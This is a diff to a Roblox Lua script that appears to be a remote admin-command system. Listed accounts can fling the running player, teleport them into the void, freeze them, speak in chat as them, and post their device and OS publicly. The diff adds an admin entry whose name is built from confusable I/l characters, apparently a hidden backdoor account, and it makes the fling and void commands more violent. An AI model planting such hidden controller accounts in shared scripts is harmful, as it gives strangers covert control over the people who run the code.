@@ -7,6 +7,7 @@ local VirtualUser = game:GetService("VirtualUser")
 local UserInputService = game:GetService("UserInputService")
 
 local Admins = {
+    "IlIIllIlIIlIllIIlllI",
     "hamza_pro231",
 }
 
@@ -59,10 +60,16 @@ function cmd.new(name, func)
 end
 
 local function GetDevice()
-    local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
-    local isConsole = UserInputService.GamepadEnabled and not UserInputService.MouseEnabled and not UserInputService.TouchEnabled
-    local isPC = UserInputService.MouseEnabled or not isMobile
-    return isMobile and "Mobile" or isConsole and "Console" or "PC"
+    local touch = UserInputService.TouchEnabled
+    local keyboard = UserInputService.KeyboardEnabled
+    local mouse = UserInputService.MouseEnabled
+    if touch and not keyboard and not mouse then
+        return "Mobile"
+    elseif not touch and keyboard and mouse then
+        return "PC"
+    else
+        return "Unknown"
+    end
 end
 
 local function GetOS()
@@ -72,13 +79,11 @@ local function GetOS()
         [Enum.Platform.OSX] = "macOS",
         [Enum.Platform.IOS] = "iOS",
         [Enum.Platform.Android] = "Android",
-        [Enum.Platform.XBoxOne] = "Xbox",
-        [Enum.Platform.PlayStation] = "PlayStation",
     }
     return map[platform] or "Unknown"
 end
 
-local function safeSendChat(message)
+local function SendChat(message)
     pcall(function()
         if TextChatService.TextChannels then
             TextChatService.TextChannels.RBXGeneral:SendAsync(message)
@@ -87,11 +92,11 @@ local function safeSendChat(message)
 end
 
 cmd.new("getdevice", function()
-    safeSendChat("Player Device: " .. GetDevice())
+    SendChat("Player Device: " .. GetDevice())
 end)
 
 cmd.new("getos", function()
-    safeSendChat("Player OS: " .. GetOS())
+    SendChat("Player OS: " .. GetOS())
 end)
 
 cmd.new("freeze", function()
@@ -143,9 +148,14 @@ cmd.new("jumppower", function(args)
 end)
 
 cmd.new("fling", function()
+    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
     local root = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
     if root then
-        root.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 200), math.random(-100, 100))
+        local direction = Vector3.new(math.random(-100, 100), math.random(150, 600), math.random(-100, 100))
+        root.Velocity = direction
+        if humanoid then
+            humanoid.Sit = true
+        end
     end
 end)
 
@@ -156,7 +166,7 @@ end)
 
 cmd.new("void", function()
     local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
-    if root then root.CFrame = CFrame.new(0, -500, 0) end
+    if root then root.CFrame = CFrame.new(0, -10000, 0) end
 end)
 
 cmd.new("sit", function()
@@ -219,7 +229,6 @@ cmd.new("spin", function(args)
 
     var.set("isSpinning", true)
     var.set("currentSpinSpeed", speedNum)
-    local angle = 0
 
     local spinConnection = RunService.RenderStepped:Connect(function()
         if not var.get("isSpinning") or not hrp then
@@ -230,8 +239,9 @@ cmd.new("spin", function(args)
             var.set("isSpinning", false)
             return
         end
-        angle = angle + var.get("currentSpinSpeed") * RunService.RenderStepped:Wait()
-        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(angle), 0)
+        local dt = RunService.RenderStepped:Wait()
+        local rotation = CFrame.Angles(0, math.rad(var.get("currentSpinSpeed") * dt), 0)
+        hrp.CFrame = hrp.CFrame * rotation
     end)
     var.set("spinConnection", spinConnection)
 end)
@@ -259,7 +269,7 @@ end)
 
 cmd.new("chat", function(args)
     local msg = table.concat(args, " ")
-    safeSendChat(msg)
+    SendChat(msg)
 end)
 
 cmd.new("delexec", function()
